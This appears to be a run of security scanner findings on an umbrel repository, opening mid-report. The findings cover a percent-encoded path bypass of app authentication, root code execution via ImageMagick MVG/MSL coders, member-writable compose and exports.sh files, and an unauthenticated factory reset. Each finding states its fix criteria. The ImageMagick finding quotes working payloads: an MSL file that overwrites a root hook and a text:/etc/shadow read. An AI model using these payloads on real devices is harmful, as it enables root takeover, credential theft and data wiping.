   readAppGatewayConfig() reads PROXY_AUTH_WHITELIST / PROXY_AUTH_BLACKLIST from the app's app_proxy environment (rendered to app-gateway.json by legacy-compat/app-script); these are the documented app_proxy settings apps use to expose some paths publicly while keeping sub-paths behind Umbrel login. Authentication is on by default (line 95).
5. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:868–888](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L868-L888)
   Production wiring: for every app route with an app_proxy service, lan-ingress constructs an AppGateway, binds its server on a hidden loopback port, and fronts it with the mux listening on the app's hidden port that nftables redirects the app's public LAN port to. The gateway is therefore the only control between an unauthenticated LAN/Tor/Tailscale peer and the app container.
6. [packages/umbreld/source/modules/lan-ingress/lan-ingress.vm.test.ts:368–375](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.vm.test.ts#L368-L375)
   The project's own end-to-end test fixture (whitelist /public/*, blacklist /public/private/*, lines 711-712) asserts that an unauthenticated request to /public/private/status must receive the 302 login redirect: the blacklisted sub-path is a defended boundary, and the percent-encoded form of the same path crosses it.

## Impact
Blacklisted sub-paths are precisely the endpoints an app chose to keep behind Umbrel login inside an otherwise public area (admin or API routes). The bypass gives anonymous network clients the same read and write reach over those endpoints that a logged-in Umbrel user would have, so confidentiality and integrity of the affected app's protected data are compromised. Impact is confined to the affected app's blacklisted routes (not the whole device), and availability is not directly affected.

## Reproduction steps
1. An unauthenticated client on the LAN/Tailscale/Tor reaches the app's public port, which nftables redirects to the lan-ingress mux fronting the AppGateway (lan-ingress.ts:868-889). It sends a GET or WebSocket upgrade whose path percent-encodes one character of a blacklisted segment beneath a whitelisted prefix (e.g. /public/%70rivate/secret). isAuthorized() matches the encoded literal against the rules, treats it as whitelisted-and-not-blacklisted, and proxies the raw URL; the upstream decodes it and serves the protected resource. No credentials, no user interaction, deterministic, trivially scriptable. Attack requirements are present because the target app must be configured with blacklist rules (or non-slash prefix whitelist rules) under a whitelisted area and its upstream must decode percent-escapes before routing, which most HTTP servers and frameworks do.

## Recommended fix
isAuthorized() evaluates PROXY_AUTH_WHITELIST/BLACKLIST against a WHATWG pathname that still contains percent-escapes, while the upstream receives and decodes the original request.url, so the authorisation decision and the served resource are computed from different canonical forms of the path. Fix criteria: The gateway makes whitelist/blacklist decisions on a fully canonicalised path (percent-decoded, dot-segments resolved, backslashes and repeated slashes normalised, invalid or overlong encodings rejected) and forwards only that canonical path, or rejects requests whose raw path differs from the canonical one after re-encoding. Verify: with whitelist /public/* and blacklist /public/private/*, requests for /public/%70rivate/x, /public%2Fprivate/x and /public/./private/x all receive the login redirect (HTTP) or 401 (WebSocket) instead of being proxied, for both HTTP requests and WebSocket upgrades.

---
**Severity:** HIGH
**Status:** Open
**Category:** Authorization bypass
**CWE:** [CWE-647](https://cwe.mitre.org/data/definitions/647.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257918

---

# Root ImageMagick thumbnailer lets uploaded file content select the MVG/MSL script coders

## Details
The file-index enrichment lane thumbnails every photo/video that lands in an indexed root by running ImageMagick `convert` as root (umbreld worker thread) on the raw file passed as `/dev/fd/3[0]`. For every still-image extension no coder prefix is given (`imageMagickMediaProcessInput` only prefixes camera RAW and video), so ImageMagick selects the decoder by sniffing the file's first bytes. A file named `evil.jpg` whose content starts with `push graphic-context` is decoded by the MVG coder, which interprets the file as a drawing script; MVG's `image` primitive reads a secondary image through any enabled coder, including `msl:` (an XML script whose `<read>`/`<write filename=…>` elements read and write files at arbitrary paths, with raw formats such as `gray:` giving byte-exact control of the written bytes), `text:` (renders any readable host file's text into pixels) and `ephemeral:` (deletes the file after reading).

Attack path (member account, in scope per the threat model): the member uploads `payload.msl` (`<image><read filename="/home/umbrel/umbrel/members/<slug>/home/pixels.png"/><write filename="gray:/opt/umbrel-custom-hooks/run-pre-start"/></image>`, where pixels.png is a 1×N 8-bit grayscale image whose pixel values are the payload bytes) and `evil.jpg` containing `push graphic-context\nviewbox 0 0 1 1\nimage Over 0,0 0,0 'msl:/home/umbrel/umbrel/members/<slug>/home/payload.msl'\npop graphic-context`. Member homes are `kind: 'home'` index roots, so `#backgroundStep` hashes `evil.jpg` and runs `#ensureContentThumbnail` within seconds without owner action; root `convert` sniffs MVG, executes the script, and MSL writes the attacker's bytes to the chosen path. Overwriting an existing root-executed file (the pre-start hook runner, umbreld's own TS sources under /opt/umbreld, /etc/ImageMagick-6/delegates.xml, /etc/ld.so.preload) preserves its mode and yields root code execution; note that creating a new `custom-hooks/pre-start` is not sufficient on its own because run-pre-start skips a hook without the executable bit. The `text:` variant (`image Over 0,0 0,0 'text:/etc/shadow'` with a larger viewbox) renders any host file — umbrel.yaml with network-storage credentials, secrets/auth/sessions.yaml, /etc/shadow — into the member's own thumbnail, which /api/files/thumbnail serves back to them for their own path.

The same sink is reachable by any other producer of files in an indexed root: photo backups from a member's phone, a third-party app writing into app-data (thumbnailed on demand when the owner browses /Apps), a USB stick or network share, or cloud-synced files.

Explicit dependency assumptions (not verifiable in this checkout; they bound the rating): (1) Debian trixie's `imagemagick` (IM6 6.9.13 series via the pinned apt snapshot) ships `/etc/ImageMagick-6/policy.xml` that disables only PS/PS2/PS3/EPS/PDF/XPS coders, the URL/HTTP/HTTPS delegates and `@*` paths, leaving MVG, MSL, TEXT and EPHEMERAL enabled; (2) IM6's MVG coder registers an IsMVG magic handler (`push graphic-context`) so content sniffing selects it for a pathless descriptor; (3) IM6's `image` drawing primitive calls ReadImage on the literal `msl:`/`text:` filename (only an exact-string check for bare `caption:`/`label:`/`text:`, a character-device check and an SVG-module check apply), and MSL's `<write>` calls WriteImage on the attacker-chosen path with no path policy. umbreld applies no policy override, `-define`, sandbox or privilege drop that would change any of this; the Dockerfile comment ('Files and Photos decode untrusted HEIF/AVIF images through ImageMagick') shows the maintainers treat this input as hostile but hardened only libheif.

## Evidence
1. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2771–2812](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2771-L2812)
   generateThumbnailFiles builds the `convert` argument list: only -limit resource flags, then `<input>[0]` where input is `/dev/fd/3` with no coder prefix for every still-image extension, then -thumbnail/-write per variant. No -define/policy restriction, no explicit decoder, so ImageMagick's SetImageInfo chooses the coder from the first bytes of the attacker's file; a file beginning with `push graphic-context` is handed to the MVG script coder.
2. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2863–2875](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2863-L2875)
   imageMagickMediaProcessInput adds a coder prefix only for extensions in IMAGE_MAGICK_MEDIA_CODERS (camera RAW and video containers). For .jpg/.png/.gif/.webp/.tif/.bmp/… the pathless `/dev/fd/3` is passed bare, so the filename extension never constrains the decoder.
3. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2877–2890](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2877-L2890)
   runBoundedMediaProcess spawns `convert` via execa with only detached/timeout/SIGKILL and fd 3 = the source file. No uid/gid, no sandbox: the process inherits umbreld's root identity (umbrel.service sets no User=) and full host filesystem access.
4. [packages/umbreld/source/modules/files/file-index-enrichment.ts:1374–1394](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L1374-L1394)
   #ensureContentThumbnail opens the indexed source file (openContentRevision) and passes its descriptor to #generateThumbnails for every missing variant — the sole gate is that the entry needs a thumbnail.
5. [packages/umbreld/source/modules/files/file-index-enrichment.ts:640–656](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L640-L656)
   #backgroundStep takes each newly indexed entry needing a hash from roots matching BACKGROUND_ENRICHMENT_ROOT_SQL (line 44: kind IN ('home','trash')) and, when photoKind() matches the extension, immediately runs #backgroundThumbnailStep. A freshly uploaded `.jpg` in a member's home is therefore thumbnailed with no owner interaction.
6. [packages/umbreld/source/modules/files/files.ts:417–432](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L417-L432)
   #memberIndexRoots registers every member's home as an index root of kind 'home' (background-enriched) at the predictable system path <dataDirectory>/members/<slug>/home (line 2110), so a member knows the absolute path of each file they upload and can reference it from an MVG `image` primitive.
7. [packages/umbreld/source/modules/files/api.ts:149–150](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L149-L150)
   POST /api/files/upload is authorized by authorizeDashboardRequest, which accepts any dashboard session (owner or member). receiveUpload then resolves the member's /Users/<slug> path with their own accountId and writes the bytes verbatim — no content/magic-byte check, unlike the avatar uploader (user/avatar.ts uploadedImageFormat).
8. [packages/os/overlay/etc/systemd/system/umbrel.service:6–8](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/etc/systemd/system/umbrel.service#L6-L8)
   umbreld runs under systemd with no User=/DynamicUser=, i.e. as root; the enrichment worker thread and every child `convert` inherit that identity.
9. [packages/os/umbrelos.Dockerfile:421](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/umbrelos.Dockerfile#L421)
   The OS image installs Debian trixie's stock `imagemagick` (IM6 `convert`, apt snapshot 20260727) and nothing in packages/os overlays /etc/ImageMagick-6/policy.xml or sets MAGICK_* environment: the distro default policy applies, which restricts only the Ghostscript coders, URL/HTTP(S) delegates and `@*` paths.

## Impact
Arbitrary file write with controlled content and arbitrary file read (as rendered text) as root on the host: overwrite of root-executed scripts/sources gives root code execution, i.e. full compromise of umbreld, every account's data and credentials, and the device.

## Reproduction steps
1. An authenticated member uploads two small files to their own home through POST /api/files/upload (any dashboard session is accepted; no content validation). Member homes are background-enriched 'home' roots at a predictable system path, so within seconds root `convert` processes the file with no owner interaction and no additional runtime condition. The MVG script references the member's second file via `msl:` and writes attacker-controlled bytes to an arbitrary host path, or renders arbitrary host files via `text:` into the member's own thumbnail. No shipped defensive mechanism (policy, sandbox, privilege drop, coder pinning) exists to bypass; the attack works against the default image as built, subject to the stated assumption about Debian's default ImageMagick policy and IM6 coder behaviour.

## Recommended fix
1. Thumbnail generation lets ImageMagick choose the decoder by content sniffing and runs with the distro default coder policy, so script-like coders (MVG, MSL, TEXT, EPHEMERAL, inline/URL, pipes) are reachable from untrusted file bytes. Fix criteria: Only the raster decoder expected for the file's extension (or verified magic bytes) can ever be selected: an explicit coder prefix per extension and/or an umbrelOS-shipped policy.xml (or MAGICK_CONFIGURE_PATH) with rights=none for MVG, MSL, TEXT, EPHEMERAL, INLINE, URL, HTTP(S), FTP, SHOW, WIN, PLT, `@*` and `|*` paths. Verify that a `.jpg` whose content is an MVG script referencing `msl:` or `text:` fails to decode and reads/writes nothing.
2. The media tools (convert, ffprobe, exiftool) parse hostile content with root privileges and full host filesystem access. Fix criteria: Run the thumbnail/metadata subprocesses as an unprivileged user and/or inside a filesystem-restricted sandbox (bwrap/seccomp/systemd-run with a read-only bind of the source and write access only to the thumbnail temp path), so a decoder compromise or script coder cannot read or write host paths. Verify that a decoder-side write to /root, /opt or /home/umbrel/umbrel fails.

---
**Severity:** HIGH
**Status:** Open
**Category:** Code injection
**CWE:** [CWE-94](https://cwe.mitre.org/data/definitions/94.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257917

---

# Member share of an app directory grants write access to compose/exports.sh, enabling host root

## Details
The Files member-share feature lets the owner grant member accounts read-write access to owner paths. `MemberShares.add()` (member-shares.ts:195-215) explicitly allows sharing `/Apps/<appId>` – the root of an installed app's directory – and only verifies it exists and is a directory. The dashboard offers exactly this (context menu for any `/Apps/...` directory, dialog text 'Users get full access to this folder, and can view, add, and edit files inside of it'). That directory is `<dataDir>/app-data/<appId>` (app.ts:560) and is not just app data: it holds `docker-compose.yml`, `umbrel-app.yml`, `exports.sh`, `settings.yml`, hooks and the generated user-settings compose override – the files umbreld (running as root) uses to render and run the app.

`Files.getAllowedOperations()` protects only the exact `/Apps/<appId>` path from move/rename/trash/delete (files.ts:1852-1870); its children remain writable, renamable and trashable, and for a member whose grant covers the path the operation set is inherited from the owner with trash swapped for hard delete (files.ts:1946-1964). `authorizeDestinationSystemPath(replace=true)` (files.ts:2060-2068) allows overwriting any file the caller may delete, so upload (api.ts receiveUpload → authorizeWritableDestinationSystemPath), `move` with `collision:'replace'` and `rename` all succeed for `/Apps/<appId>/docker-compose.yml` and `/Apps/<appId>/exports.sh` when called by a member.

Nothing restores integrity afterwards: `patchComposeFile()` (app.ts:1269-1330), run before every start/restart, reads the on-disk app-data compose and rewrites it in place rather than regenerating it from the app-store template. The root-run `app-script` then composes from `${app_data_dir}/docker-compose.yml` (app-script:400-418, start_app 619-636) and `source_app` sources `app-data/<id>/exports.sh` for the app and every dependent (app-script:249-277) on start, stop, restart, update and the `images` command the image-cleanup sweep runs for every installed app after any install/update/uninstall.

Consequence: once the owner shares an app folder with a member, that member can overwrite the compose file (e.g. `privileged: true` plus a `/:/host` bind mount) or drop arbitrary shell into `exports.sh`; it executes as root at the next app lifecycle action, image-cleanup sweep, or device reboot. Members cannot trigger those themselves (apps.start/stop/restart/logs are owner procedures), but all occur in normal operation.

The threat model states members must not reach the host. The owner's sharing action is framed by the UI as file access to a folder; the grant's effect (root execution definition) exceeds that apparent scope, so this is a scoped-permission flaw with the owner/host as victim, not intended design. The maintainers' comment in member-shares.ts ('App sharing is handled separately by the app proxy and does not grant raw /Apps data access') refers to `appMemberShares`; the Files `memberShares` path analysed here does grant raw app-directory access.

## Evidence
1. [packages/umbreld/source/modules/files/member-shares.ts:195–214](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/member-shares.ts#L195-L214)
   MemberShares.add() accepts any /Apps path with >=2 segments, so the owner can share '/Apps/<appId>' itself (the whole app-data directory) read-write with members. Only existence and directory-ness are checked; the app's root-executed control files (docker-compose.yml, exports.sh, umbrel-app.yml, settings.yml, hooks) living directly in that directory are not excluded from the grant. This is the primary fix location.
2. [packages/umbreld/source/modules/files/files.ts:1852–1869](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1852-L1869)
   getAllowedOperations protects only the exact '/Apps/<appId>' path from move/rename/trash/delete (comment: 'only the exact paths are protected, not necessarily the children'). Children such as '/Apps/<appId>/docker-compose.yml' and 'exports.sh' keep 'writable', 'rename', 'move' and 'trash'.
3. [packages/umbreld/source/modules/files/files.ts:1946–1963](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1946-L1963)
   For a member on an owner path, memberShares.shareGrantFor is the only gate; once a grant covers the path the member inherits the owner's operation set minus 'share', and 'trash' is swapped for hard 'delete'. No exclusion for app control files exists here.
4. [packages/umbreld/source/modules/files/files.ts:2060–2067](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2060-L2067)
   authorizeDestinationSystemPath(replace=true) permits overwriting an existing file whenever the caller holds 'trash' or 'delete' on it, which a member does for '/Apps/<appId>/docker-compose.yml'. This is what move(collision:'replace') (files.ts:1217-1224) and receiveUpload (api.ts:272, via authorizeWritableDestinationSystemPath) rely on, so a member can replace the compose file or exports.sh wholesale.
5. [packages/umbreld/source/modules/apps/app.ts:1269–1329](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/app.ts#L1269-L1329)
   patchComposeFile(), run by #start() and #restart() before every start, reads the on-disk compose from app-data (readCompose -> dataDirectory = '<dataDir>/app-data/<id>', app.ts:560, 585-587), patches container names/volumes/GPU in place and writes it back. It never regenerates from the app-store template, so a member-written docker-compose.yml persists and is what docker compose receives.
6. [packages/umbreld/source/modules/apps/legacy-compat/app-script:400–417](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/legacy-compat/app-script#L400-L417)
   compose() first calls source_app (which sources exports.sh) and then composes from app_compose_file="${app_data_dir}/docker-compose.yml" — the member-writable file. start_app (lines 619-636) runs 'compose up --detach --build' on it as root.
7. [packages/umbreld/source/modules/apps/legacy-compat/app-script:249–276](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/legacy-compat/app-script#L249-L276)
   source_app sources '<UMBREL_ROOT>/app-data/<appId>/exports.sh' (via a sed'd temp copy) for the app and all transitive dependencies. It runs on start, stop, restart, update and on the 'images' command used by the image-cleanup sweep, all as root. A member-written exports.sh is arbitrary bash as root.
8. [packages/ui/src/features/files/components/listing/listing-and-file-item-context-menu.tsx:185–192](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/listing/listing-and-file-item-context-menu.tsx#L185-L192)
   The shipped dashboard offers 'Share with users' on any directory whose path starts with '/Apps/', including the app root '/Apps/<appId>', and the dialog text (public/locales/en.json 'files-share-users.description') frames it as file access: 'Users get full access to this folder, and can view, add, and edit files inside of it'. Nothing warns the owner that the grant also hands over the app's root-executed definition.

## Impact
A member-controlled compose file (privileged container with the host filesystem bind-mounted) or exports.sh (sourced by a root bash process via app-script) yields arbitrary code execution as root on the umbrelOS host: full read/write of the owner's and all members' data, credentials in umbrel.yaml, session secrets, and the ability to disable or brick the device.

## Reproduction steps
1. Attacker is an authenticated member account reaching the dashboard over LAN/Tor/Tailscale (AV:N, PR:L). Precondition (AT:P): the owner has shared `/Apps/<appId>` (or a subtree containing the control files) with that member via the shipped Files 'Share with users' flow, which the UI offers for any /Apps directory and describes as folder file access. The member then uses ordinary member-permitted Files mutations – upload with collision:'replace', move with collision:'replace', or delete + upload – on `/Apps/<appId>/docker-compose.yml` or `exports.sh`; all pass virtualToSystemPath (grant covers the path), getAllowedOperations (children of the app root are not protected) and authorizeDestinationSystemPath (member holds 'delete'). No user interaction is needed at exploit time (UI:N); the payload runs as root on the next owner-initiated start/stop/restart/update of that app or a dependent, the next image-cleanup sweep after any app install/update/uninstall, or device reboot – routine events the member can simply wait for. AC:L: no race or guessing.

## Recommended fix
1. MemberShares.add() allows the app directory root (and thus its control files) to be shared; the share grant conveys write access to files that define root-executed behaviour, violating the member/host trust boundary. Fix criteria: A member grant must never confer write (or ideally read) access to an app's control files. Either refuse to share `/Apps/<appId>` itself (only allow data subdirectories such as `/Apps/<appId>/data`), or make umbreld's control files (docker-compose.yml, docker-compose.umbrel-user-settings.yml, umbrel-app.yml, exports.sh, settings.yml, hooks) non-writable/undeletable/unrenamable for members in getAllowedOperations and the authorizeDestination paths. Verify: a member with an `/Apps/<appId>` share cannot upload, replace, rename or delete those files, and existing shares at the app root are migrated or rejected.
2. App start/restart trusts the on-disk compose and exports.sh in app-data without integrity checks, so any writer to that directory controls root execution. Fix criteria: Defence in depth: umbreld should treat app-data control files as umbreld-owned artifacts (e.g. regenerate from the app store on start, or verify a stored hash) so that a stray write by another principal does not become root code execution. Verify that modifying docker-compose.yml/exports.sh via the Files API does not change what runs at the next app start.

---
**Severity:** HIGH
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-732](https://cwe.mitre.org/data/definitions/732.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257915

---

# Factory reset wipes boot config and data partition without authentication in RAID recovery mode

## Details
When the RAID pool fails to import or mounts unwritable at boot (a disk of a striped 'storage' pool missing, a pool ZFS forced read-only after errors, an import timeout), `umbrel-data-mount` exits non-zero (packages/os/overlay/opt/umbrel-data/umbrel-data-mount:151-172), rugix records `/run/rugix/mounts/data/.rugix/data-mount-error.log`, falls back to an in-memory overlay (`overlay-fallback = "in-memory"` in state-data.toml) and umbreld starts with an empty store. `user.exists()` is therefore false and every `publicProcedureWhenNoUserExists` route falls open via `isAuthenticatedIfUserExists` (is-authenticated.ts:62-65). lan-ingress starts unconditionally (index.ts:293), so the dashboard API is served on 80/443 in this state.

`system.factoryReset` (system/routes.ts:309-333) is on that tier and additionally skips the owner-password check whenever `checkRaidMountFailure()` is true (a bare file-existence test, raid.ts:1196-1199), on the inline premise that 'user data is inaccessible'. That premise is wrong on two counts: the owner's bcrypt hash is deliberately kept on the config partition (`configStore.user.hashedPassword`, written by user.ts:165-169) and could authenticate the owner; and the data is not gone, it sits intact on the RAID disks and is recovered by reconnecting the disk or by `recoverExistingInstall`. Any unauthenticated peer that can reach the dashboard can POST `system.factoryReset` with `{}`. After an 11 s delay `performReset` (factory-reset.ts:16-32) runs: in recovery mode the live data mount is the in-memory overlay, not `<pool>/data` on zfs, so `isRunningFromRaidData()` (raid.ts:528-540) is false and umbreld runs `rugix-ctrl state reset --backup ...`; rugix then executes the shipped `state-reset/prepare` hook on the next boot (prepare.sh header lines 3-10), which `mkfs.ext4 -F` the main-disk data partition and `rm -f` the config partition's `umbrel.yaml` (prepare.sh:29-77), i.e. the RAID device list and the saved owner name/hash. The project's own VM test (raid-recovery-mode.vm.test.ts:195-236) exercises exactly this unauthenticated call from recovery mode and asserts the end state: no user exists and `checkRaidMountFailure()` is false because no RAID config remains.

Consequences for the owner: the device forgets it has a RAID pool, boots into first-run onboarding instead of recovery mode, loses the config-partition copy of the owner's credentials, and can only be restored if `hardware.raid.recoverExistingInstall` finds exactly one importable umbrel pool. Because `user.register` is `publicProcedure` gated only on `user.exists()` (user/routes.ts:57-71), the same attacker can immediately register as the new owner of the hardware (and, as owner, run `raid.setup` against the original disks, or import the original pool with the hard-coded dataset key when it is importable). A transient fault such as a loose SSD or a read-only-after-errors pool thus becomes a window in which an unauthenticated network peer can wipe the installation's boot state and take ownership of the device.

This is deliberate per the inline comments and the VM test, but it is a conscious removal of authentication from a destructive root-level operation against an owned device, with a clear victim and an available authenticator the code already maintains. `shutdown`/`restart` (routes.ts:289-297) are open in the same state; their impact is availability only and they are not filed separately.

## Evidence
1. [packages/umbreld/source/modules/system/routes.ts:309–333](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system/routes.ts#L309-L333)
   factoryReset is publicProcedureWhenNoUserExists and skips the owner-password check whenever checkRaidMountFailure() is true, so in recovery mode any network peer can trigger performReset with an empty input. This is the code the fix must change.
2. [packages/umbreld/source/modules/system/factory-reset.ts:16–32](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system/factory-reset.ts#L16-L32)
   performReset has no further authorization: it runs the state-reset prepare hook directly when the live data mount is the RAID dataset, otherwise (the recovery-mode case) `rugix-ctrl state reset --backup`, which makes rugix run the same hook on the next boot.
3. [packages/os/rugix/recipes/setup-rugix/files/hooks/state-reset/prepare.sh:3–77](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/rugix/recipes/setup-rugix/files/hooks/state-reset/prepare.sh#L3-L77)
   Shipped as /etc/rugix/hooks/state-reset/prepare/10-umbrel.sh; the header documents that rugix runs it before a normal state reset. With a RAID config present it reformats the main-disk data partition with mkfs.ext4 -F and deletes the config partition's umbrel.yaml, which holds the RAID device list and the saved owner name/password hash.
4. [packages/umbreld/source/modules/server/trpc/is-authenticated.ts:62–65](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/trpc/is-authenticated.ts#L62-L65)
   isAuthenticatedIfUserExists falls open to unauthenticated callers whenever user.exists() is false, which is the case in recovery mode because umbreld's store lives on rugix's in-memory fallback overlay.
5. [packages/umbreld/source/modules/user/user.ts:165–169](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/user.ts#L165-L169)
   The owner's bcrypt hash is written to the RAID config partition on every password change, so an authenticator for the owner is available in recovery mode; the route's 'user data is inaccessible' premise for skipping the password check does not hold.
6. [packages/umbreld/source/modules/hardware/raid.ts:1196–1198](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L1196-L1198)
   checkRaidMountFailure is only a file-existence check for rugix's data-mount-error log; it is true for any pool that failed to import or mounted unwritable this boot, not just a destroyed one.
7. [packages/umbreld/source/modules/hardware/raid.ts:528–540](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid.ts#L528-L540)
   In recovery mode the data mount is the in-memory overlay rather than `<pool>/data` on zfs, so isRunningFromRaidData() is false and performReset takes the `rugix-ctrl state reset` path.
8. [packages/os/overlay/opt/umbrel-data/umbrel-data-mount:151–172](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/overlay/opt/umbrel-data/umbrel-data-mount#L151-L172)
   Documents the recovery-mode entry condition: a pool that mounts but is not writable is treated as a mount failure; rugix records data-mount-error.log, falls back to an in-memory overlay, and umbreld boots into recovery mode with an empty store.
9. [packages/umbreld/source/modules/hardware/raid-recovery-mode.vm.test.ts:195–236](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/hardware/raid-recovery-mode.vm.test.ts#L195-L236)
   The project's VM test calls system.factoryReset with the unauthenticated client from recovery mode and asserts the resulting state: no user exists and no RAID mount failure remains (the RAID config was deleted). Confirms the end-to-end effect and that the behaviour is intended.
10. [packages/umbreld/source/modules/user/routes.ts:57–71](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/user/routes.ts#L57-L71)
   user.register is publicProcedure gated only on user.exists(); after the reset boots the device into onboarding, the same unauthenticated peer can register as the new owner of the hardware.

## Impact
Integrity: the boot-disk data partition is reformatted and the config partition's RAID configuration and owner credential copy are deleted; the device is converted into an unowned onboarding state that the attacker can claim through the sanctioned `user.register` path and then administer as owner. Availability: the owner loses the device until a manual recovery that depends on exactly one importable umbrel pool being found. Confidentiality: the reset itself discloses nothing, but the attacker-owner has root-equivalent control of the host and the original pool uses a hard-coded dataset key, so pool contents become readable where the pool is importable (the forced-read-only failure case); rated LOW because that disclosure is indirect and conditional on the failure mode.

## Reproduction steps
1. Attacker is any peer who can reach the dashboard port served by lan-ingress on 80/443 (LAN, or Tailscale/Tor where those survive the failed mount, or a browser coerced via DNS rebinding). Precondition outside the attacker's control: the device must be in RAID mount-failure recovery mode (pool failed to import, e.g. a striped pool with a disconnected disk, or mounted read-only after errors), a real operational state the maintainers test for in raid-recovery-mode.vm.test.ts. No credentials and no user interaction: one tRPC mutation `system.factoryReset` with `{}` triggers the root-level reset and reboot.

## Recommended fix
1. The factoryReset route treats RAID mount failure as proof that nobody can or needs to authorize a destructive reset, so a root-level wipe of the boot config and main-disk data partition is reachable with no credential while the owner's data still exists on the disks and the owner's password hash is still available on the config partition. Fix criteria: In recovery mode the reset must still require proof of ownership — validating the supplied password against the owner hash saved on the config partition (`configStore.user.hashedPassword`), or a physical/local-console confirmation — and an unauthenticated `system.factoryReset` call in mount-failure state must be rejected before `performReset` or the prepare hook runs.
